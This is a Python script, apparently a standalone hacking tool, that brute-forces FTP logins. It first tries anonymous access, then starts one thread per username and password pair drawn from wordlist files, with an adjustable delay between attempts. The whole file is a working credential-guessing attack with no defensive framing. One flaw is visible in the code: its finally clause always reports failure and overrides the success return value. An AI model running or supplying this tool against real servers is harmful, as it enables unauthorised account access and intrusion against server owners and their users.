# -*- coding: utf-8 -*-
# @Autor: Diego Rodrigues Pereira
import ftplib
import optparse
import time
import threading

Found = False
thLock = threading.Semaphore(value=1)
TestAnonLogin = True

def anon_login(hostname):
    global TestAnonLogin
    TestAnonLogin = False
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'lock')
        print('\n[*] ' + str(hostname) + ' FTP AnonymousLogon Succeeded.')
        ftp.quit()
        exit(0)
    except Exception as e:
        print('\n[-] ' + str(hostname) + ' FTP Anonymous Logon Failed.')

def print_msg(msg):
        thLock.acquire()
        print(msg)
        thLock.release()

def brute_login(hostname, userName, passWord,time_delay):
    
    time.sleep(time_delay)
    global Found
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login(userName, passWord)
        msg = '\n[*] ' + str(hostname) + ' FTP LogonSucceeded: ' + userName + '/' + passWord
        print_msg(msg)
        ftp.quit()
        Found = True
        return (userName, passWord)
    except Exception as e:
        pass
    finally:
        msg = '\n[-] Could not brute force FTP credentials. username is:%s'%(userName,)
        print_msg(msg)
        return (None, None)

def run():
    parser = optparse.OptionParser('usage: ' + '-H <target host> -u <user list> -p <password list>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-u', dest='userList', type='string', help='specify user list file')
    parser.add_option('-p', dest='passwdList', type='string', help='specify password list file')
    parser.add_option('-d', dest='delay', type='int', help='attack time delay set default 1s', default=1)
    (options, args) = parser.parse_args()
    host = options.tgtHost
    user_list_file = options.userList
    passwd_list_file = options.passwdList
    time_delay = options.delay
    if host == None or user_list_file == None or passwd_list_file == None:
        print(parser.usage)
        exit(0)
    user_list = open(user_list_file, "r").readlines()
    passwd_list = open(passwd_list_file, "r").readlines()
    if TestAnonLogin:
        anon_login(host)
    for user in user_list:
        for passwd in passwd_list:
            userName = user.strip('\r').strip('\n')
            passWord = passwd.strip('\r').strip('\n')
            print('[+] Trying: ' + userName + '/' + passWord)
            t = threading.Thread(target=brute_login, args=(host, userName, passWord, time_delay))
            t.start()
            if Found:
                print("[*] Exiting: Key Found")
                exit(0)

if __name__ == '__main__':
    run()
